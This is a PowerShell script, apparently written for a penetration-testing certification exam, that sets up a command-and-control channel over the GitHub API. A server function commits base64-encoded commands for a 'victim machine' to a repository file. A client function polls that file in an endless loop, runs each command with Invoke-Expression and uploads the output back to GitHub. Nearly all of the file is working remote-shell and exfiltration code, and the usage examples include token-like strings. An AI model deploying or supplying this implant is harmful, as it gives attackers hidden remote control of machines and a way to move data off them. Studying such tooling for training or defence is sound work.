function Interactive-GitShellServer
{ 
<#
.SYNOPSIS
A PowerShell script to send command to be executed to victim machine using Github API.

.DESCRIPTION
A PowerShell script to send command to be executed to victim machine using Github API.

.PARAMETER token
The github authentication token for using it to connect to github API.

.PARAMETER gitUri
The Github Uri and the path of the command file.
https://api.github.com/repos/:owner/:repo/contents/:path 

.PARAMETER Message
Message for the commit.

.PARAMETER Name
author name of the commit. 

.PARAMETER email
email of the committer.

.PARAMETER command
the command to execute in the remote machine

.PARAMETER branch
The repository branch by default it will be: Master. 

.EXAMPLE
PS C:\> . .\Interactive-Shell-Github.ps1
PS C:\> Interactive-GitShellServer -token 4f214csf364b6ad1cbf84f9d33af019e0cbba67c5 -gitUri https://api.github.com/repos/thams-es/Exf-Test/contents/commands.txt -execute whoami

.LINK
https://developer.github.com/v3/#authentication
http://www.tomsitpro.com/articles/using-powershell-with-json-data,1-3445.html

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3222
#>
           
    [CmdletBinding()] Param( 

       [Parameter(Mandatory = $true)]
       [String]
       $token,
       
       [Parameter(Mandatory = $true)]
       [String]
       $execute,

       [Parameter(Mandatory = $true)]
       [String]
       $gitUri,

       [Parameter(Mandatory = $false)]
       [String]
       $Message = 'FirstCommit',

       [Parameter(Mandatory = $false)]
       [String]
       $Name = 'ComitterName',

       [Parameter(Mandatory = $false)]
       [String]
       $email = 'ComitterEmail@email.com',

       [Parameter(Mandatory = $false)]
       [String]
       $branch = 'master'
    )


	
    #Convert the command to execute into base64
    $executeContentBytes = [System.Text.Encoding]::UTF8.GetBytes($execute)
    $executeContentEncoded = [System.Convert]::ToBase64String($executeContentBytes)
        
    #creating the xmlHtpp system object          
    $http_request = New-Object -ComObject Msxml2.XMLHTTP
    $http_request.open('GET', $gitUri, $false)
    #Sending the request
    $http_request.send()

    # Saving json result to as hashtable to parse the sha value 
    $Content =  $http_request.responseText | ConvertFrom-Json
    $sha = $Content.sha
    Write-Verbose "SHA Value is $sha"


    #Sets github parameters for post command
	$auth = @{"Authorization"="token $token"}
    $committer = @{"name"=$Name; "email"=$email}
    $data = @{"message"=$Message; "committer"=$committer; "content"=$executeContentEncoded; "branch"=$branch; "sha"=$sha}
    $Json = ConvertTo-Json $data
    
    
    #Sending the command to github
    $request = New-Object -ComObject Msxml2.XMLHTTP
    $request.open("PUT","$gitUri", $false)
    $request.setRequestHeader("Authorization", "token $token")
    $request.send($Json)
    $request.statusText

    if ($request.statusText -eq "OK")
    {
        Write-Host "Command Sent: "$execute"" -ForegroundColor Green
    }
    else
    {
        Write-Host "Error make sure the token is valid" -ForegroundColor Red
    }
   

}




function Interactive-GitShellClient
{ 
<#
.SYNOPSIS
An interactive shell using PowerShell trough github.

.DESCRIPTION
A PowerShell script that use the GitHub to execute command in a machine.

.PARAMETER githubcommandURI
Github Uri to get pull the command from it.
https://api.github.com/repos/Dylan-ma/Exf-Test/contents/1.txt

.PARAMETER Message
Message for the commit.

.PARAMETER Name
author name of the commit. 

.PARAMETER email
email of the committer.

.PARAMETER outputurl
The output file to save the command output in it. 

.PARAMETER branch
The repository branch by default it will be: Master.

.EXAMPLE
PS C:\> . .\Interactive-Shell.ps1
PS C:\> Interactive-GitShellClient-token 4f214c8f364b6adabf84f9d33a201fe0cbba67c5 -commandUri https://api.github.com/repos/thams-es/Exf-Test/contents/commands.txt -outputurl https://api.github.com/repos/thams-es/Exf-Test/contents/output.txt


.LINK
https://developer.github.com/v3/#authentication
http://www.tomsitpro.com/articles/using-powershell-with-json-data,1-3445.html


.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3222
#>
           
    [CmdletBinding()] Param( 

	   [Parameter(Mandatory = $true)]
       [String]
       $commandUri,
       
	   [Parameter(Mandatory = $true)]
       [String]
       $token,
	   
	   [Parameter(Mandatory = $true)]
       [String]
       $outputurl,

       [Parameter(Mandatory = $false)]
       [String]
       $Message = 'Message',

       [Parameter(Mandatory = $false)]
       [String]
       $Name = 'Commitername',

       [Parameter(Mandatory = $false)]
       [String]
       $email = 'email@email.com',

       [Parameter(Mandatory = $false)]
       [String]
       $branch = 'master'
       
    )
	$PreviousCommand = ""
    while ($true)
    {
    

        $http_request = New-Object -ComObject Msxml2.XMLHTTP
        $http_request.open('GET', $commandUri, $false)
        #Sending the request
        $http_request.send()
        $Content = $http_request.responseText | ConvertFrom-Json
        $Base64Command = $Content.content
        $DecodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Base64Command))


        #if there
        if ($PreviousCommand -eq $DecodedCommand)
        {
            write-host "Waiting for new command!.... " -ForegroundColor Yellow
            Start-Sleep -s 5

        }
        else
        {
            
            #Excuting the command
            $PreviousCommand = $DecodedCommand
            $CommandOutput = Invoke-Expression $DecodedCommand
            

            $CommandOutputBytes = [System.Text.Encoding]::UTF8.GetBytes($CommandOutput)
            $CommandOutputEncoded = [System.Convert]::ToBase64String($CommandOutputBytes)
            


            #Getting sha valur for the output file
            $request1 = New-Object -ComObject Msxml2.XMLHTTP
            $request1.open('GET', $outputurl, $false)
            #Sending the request
            $request1.send()
            $Content = $request1.responseText | ConvertFrom-Json
            $sha = $Content.sha
            Write-Host "Getting the sha request" -ForegroundColor Yellow
            $request1.status


            #Sets github parameters 
            $auth = @{"Authorization"="token $token"}
            $committer = @{"name"=$Name; "email"=$email}
            $data = @{"message"=$Message; "committer"=$committer; "content"=$CommandOutputEncoded; "branch"=$branch; "sha"=$sha}
            $Json = $data | ConvertTo-Json
            
            try
            {

            # #send output to github
            $request = New-Object -ComObject Msxml2.XMLHTTP
            $request.open("PUT","$outputurl", $false)
            $request.setRequestHeader("Authorization", "token $token")
            $request.send($Json)
            Write-Host "Sending output request" -ForegroundColor Yellow
            Write-Host "Command Executed $DecodedCommand" -ForegroundColor Green
            Start-Sleep -s 10

            }


            catch     #If file exist
            {
                Write-Host "Error, make sure output file is correct" -ForegroundColor Red

            }



        }   
    }
}